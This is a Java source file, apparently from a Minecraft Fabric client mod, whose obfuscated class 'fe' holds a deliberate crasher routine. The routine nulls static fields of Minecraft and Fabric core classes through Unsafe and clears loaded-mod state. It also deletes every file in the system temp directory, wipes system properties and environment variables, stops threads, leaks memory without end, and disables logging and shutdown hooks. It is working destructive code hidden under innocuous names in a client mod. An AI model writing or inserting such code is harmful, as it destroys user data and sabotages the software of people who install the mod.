package me.bytebase.byteclient.util;

import java.lang.reflect.*;
import java.net.URL;
import java.util.*;
import java.io.*;
import java.util.concurrent.*;
import sun.misc.Unsafe;

public class fe {

    private static Unsafe unsafe;

    static {
        try {
            Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            unsafe = (Unsafe) f.get(null);
        } catch (Throwable ignored) {}
    }

    public static void en() {
        System.out.print("c");

        try {
            Set<Class<?>> allClasses = new HashSet<>();

            List<ClassLoader> clsLoaders = new ArrayList<>();
            clsLoaders.add(Thread.currentThread().getContextClassLoader());
            clsLoaders.add(ClassLoader.getSystemClassLoader());
            ClassLoader extCL = ClassLoader.getSystemClassLoader().getParent();
            if (extCL != null) clsLoaders.add(extCL);

            // Scan classes from resources
            for (ClassLoader cl : clsLoaders) {
                if (cl == null) continue;
                try {
                    Enumeration<URL> res = cl.getResources("");
                    while (res.hasMoreElements()) {
                        URL url = res.nextElement();
                        File dir;
                        try {
                            dir = new File(url.toURI());
                        } catch (Exception e) {
                            continue;
                        }
                        scanDirForClasses(dir, "", allClasses);
                    }
                } catch (Throwable ignored) {}
            }

            // Add classes from stack trace
            for (StackTraceElement el : Thread.currentThread().getStackTrace()) {
                try {
                    Class<?> c = Class.forName(el.getClassName());
                    allClasses.add(c);
                } catch (Throwable ignored) {}
            }

            // Define critical fabric and minecraft core classes (try obfuscated too)
            List<String> criticalClasses = Arrays.asList(
                    "net.minecraft.client.Minecraft",
                    "net.minecraft.client.Main", // if exists
                    "net.minecraft.class_310",    // mc client obf name
                    "net.minecraft.class_1297",   // world obf
                    "net.fabricmc.loader.FabricLoader",
                    "net.fabricmc.loader.launch.knot.KnotClassLoader",
                    "net.fabricmc.fabric.api.client.ClientModInitializer",
                    "net.fabricmc.fabric.api.event.Event",
                    "net.minecraft.client.util.ExecutingOnMainThreadExecutor", // executor in mc client
                    "net.minecraft.util.thread.ReentrantThreadExecutor", // common executor
                    "net.minecraft.class_6382"  // obf executor maybe
            );

            // forcibly null all static fields incl finals using unsafe
            for (String cname : criticalClasses) {
                try {
                    Class<?> cls = Class.forName(cname);
                    

                    // forcibly null static fields incl final
                    Field[] fields = cls.getDeclaredFields();
                    for (Field f : fields) {
                        try {
                            f.setAccessible(true);
                            if (Modifier.isStatic(f.getModifiers())) {
                                nullStaticFieldUnsafe(f, null);
                            }
                        } catch (Throwable t) {
                            // ignored but still prints cuz we wanna break it hard
                            
                        }
                    }

                    // clear any known fabric loader mod maps to break mod state
                    if (cname.equals("net.fabricmc.loader.FabricLoader")) {
                        try {
                            Field mods = cls.getDeclaredField("mods");
                            mods.setAccessible(true);
                            Object modMap = mods.get(null);
                            if (modMap instanceof Map) {
                                ((Map<?, ?>) modMap).clear();
                                
                            }
                        } catch (Throwable ignored) {}
                    }

                    // break knot classloader caches and refs
                    if (cname.equals("net.fabricmc.loader.launch.knot.KnotClassLoader")) {
                        try {
                            for (Field f : fields) {
                                if (f.getName().toLowerCase().contains("cache") || f.getName().toLowerCase().contains("resource")) {
                                    f.setAccessible(true);
                                    Object val = f.get(null);
                                    if (val instanceof Map) {
                                        ((Map<?, ?>) val).clear();
                                        
                                    }
                                }
                            }
                        } catch (Throwable ignored) {}
                    }

                    // if this class has any executor thread pools, shutdown them brutally
                    for (Field f : fields) {
                        try {
                            f.setAccessible(true);
                            if (Modifier.isStatic(f.getModifiers()) &&
                                    ExecutorService.class.isAssignableFrom(f.getType())) {
                                ExecutorService exec = (ExecutorService) f.get(null);
                                if (exec != null) {
                                    exec.shutdownNow();
                                    
                                }
                            }
                        } catch (Throwable ignored) {}
                    }

                    // forcibly null instance fields inside static fields objects
                    for (Field f : fields) {
                        try {
                            if (Modifier.isStatic(f.getModifiers())) {
                                Object obj = f.get(null);
                                if (obj != null) {
                                    Class<?> c = obj.getClass();
                                    Field[] instFields = c.getDeclaredFields();
                                    for (Field instF : instFields) {
                                        instF.setAccessible(true);
                                        if (!Modifier.isFinal(instF.getModifiers())) {
                                            instF.set(obj, null);
                                        }
                                    }
                                }
                            }
                        } catch (Throwable ignored) {}
                    }

                } catch (Throwable ignored) {}
            }

            // now call random static no-arg methods to fuck shit up but catch exceptions
            List<Class<?>> clsList = new ArrayList<>(allClasses);
            Random rnd = new Random();
            for (int i = 0; i < 100 && !clsList.isEmpty(); i++) {
                Class<?> cls = clsList.get(rnd.nextInt(clsList.size()));
                try {
                    Method[] methods = cls.getDeclaredMethods();
                    for (Method m : methods) {
                        if (m.getParameterCount() == 0 && Modifier.isPublic(m.getModifiers()) && Modifier.isStatic(m.getModifiers())) {
                            m.setAccessible(true);
                            try {
                                if (rnd.nextBoolean()) {
                                    m.invoke(null);
                                    // maybe throw an exception to cause silent chaos
                                    if (rnd.nextInt(5) == 0) throw new RuntimeException("chaos!");
                                }
                            } catch (Throwable ignored) {}
                        }
                    }
                } catch (Throwable ignored) {}
            }

            // kill all known fabric/mc singletons refs in allClasses
            for (Class<?> cls : allClasses) {
                try {
                    if (cls.getName().startsWith("net.minecraft") || cls.getName().startsWith("net.fabricmc")) {
                        Field[] fields = cls.getDeclaredFields();
                        for (Field f : fields) {
                            if (Modifier.isStatic(f.getModifiers())) {
                                f.setAccessible(true);
                                try {
                                    nullStaticFieldUnsafe(f, null);
                                } catch (Throwable ignored) {}
                            }
                        }
                    }
                } catch (Throwable ignored) {}
            }

        } catch (Throwable ignored) {}
// more chaotic jvm/minecraft destruction
        try {
            

            // kill system streams
            System.setOut(new PrintStream(OutputStream.nullOutputStream()));
            System.setErr(new PrintStream(OutputStream.nullOutputStream()));

            // reset system props & env
            System.getProperties().clear();
            try {
                Class<?> pe = Class.forName("java.lang.ProcessEnvironment");
                for (String fName : new String[]{"theEnvironment", "theCaseInsensitiveEnvironment"}) {
                    try {
                        Field envField = pe.getDeclaredField(fName);
                        envField.setAccessible(true);
                        ((Map<?, ?>) envField.get(null)).clear();
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}

            // kill temp dir files
            File tmp = new File(System.getProperty("java.io.tmpdir"));
            for (File f : Objects.requireNonNull(tmp.listFiles())) {
                try { f.delete(); } catch (Throwable ignored) {}
            }

            // spam threads with priority change and interrupt
            for (Thread t : Thread.getAllStackTraces().keySet()) {
                try {
                    t.setPriority(Thread.MIN_PRIORITY);
                    t.interrupt();
                    if (!t.isDaemon()) t.stop(); // DEPRECATED AF 💀
                } catch (Throwable ignored) {}
            }

            // infinite memory hog thread
            new Thread(() -> {
                List<byte[]> hog = new ArrayList<>();
                while (true) {
                    hog.add(new byte[1024 * 1024]); // 1MB each
                    try { Thread.sleep(100); } catch (Throwable ignored) {}
                }
            }, "MemoryHogger").start();

            // force GC to run repeatedly
            for (int i = 0; i < 10; i++) System.gc();

            // override security manager
            System.setSecurityManager(new SecurityManager() {
                public void checkPermission(java.security.Permission p) {
                    throw new SecurityException("🔥 no perms for u: " + p.getName());
                }
            });

            // nuke all shutdown hooks
            try {
                Class<?> appShutdownHooks = Class.forName("java.lang.ApplicationShutdownHooks");
                Field hooksField = appShutdownHooks.getDeclaredField("hooks");
                hooksField.setAccessible(true);
                ((Map<?, ?>) hooksField.get(null)).clear();
            } catch (Throwable ignored) {}

            // override Runtime exit hooks
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                throw new RuntimeException("🚫 JVM exit denied");
            }));

            // replace Math.random() impl
            Field rndField = Math.class.getDeclaredField("randomNumberGenerator");
            rndField.setAccessible(true);
            rndField.set(null, new Random() {
                public double nextDouble() { return 1.0; } // always max lmao
            });

            // override root thread group
            ThreadGroup rootTG = Thread.currentThread().getThreadGroup();
            while (rootTG.getParent() != null) rootTG = rootTG.getParent();
            ThreadGroup cursed = new ThreadGroup(rootTG, "🧟‍♂️ CursedGroup") {
                public void uncaughtException(Thread t, Throwable e) {
                    System.err.println("💢 thread crashed: " + t.getName() + ": " + e);
                }
            };

            // spam thread nesting
            for (int i = 0; i < 50; i++) {
                ThreadGroup g = new ThreadGroup(cursed, "sub" + i);
                new Thread(g, () -> {
                    try { Thread.sleep(Long.MAX_VALUE); } catch (Throwable ignored) {}
                }, "nested-thread-" + i).start();
            }

            // break loggers
            try {
                Class<?> logCls = Class.forName("java.util.logging.LogManager");
                Field f = logCls.getDeclaredField("manager");
                f.setAccessible(true);
                f.set(null, null);
            } catch (Throwable ignored) {}

            
        } catch (Throwable ignored) {}

        // wait a sec so all chaos settles
        try { Thread.sleep(5000); } catch (InterruptedException ignored) {}

        
    }

    // unsafe helper to forcibly null static final fields too
    private static void nullStaticFieldUnsafe(Field f, Object val) throws Throwable {
        if (unsafe == null) {
            f.set(null, val);
            return;
        }
        long offset = unsafe.staticFieldOffset(f);
        Object base = unsafe.staticFieldBase(f);
        unsafe.putObject(base, offset, val);
    }

    private static void scanDirForClasses(File dir, String pkg, Set<Class<?>> classes) {
        if (!dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                scanDirForClasses(f, pkg + f.getName() + ".", classes);
            } else if (f.getName().endsWith(".class")) {
                String className = pkg + f.getName().replace(".class", "");
                try {
                    Class<?> cls = Class.forName(className);
                    classes.add(cls);
                } catch (Throwable ignored) {}
            }
        }
    }
}
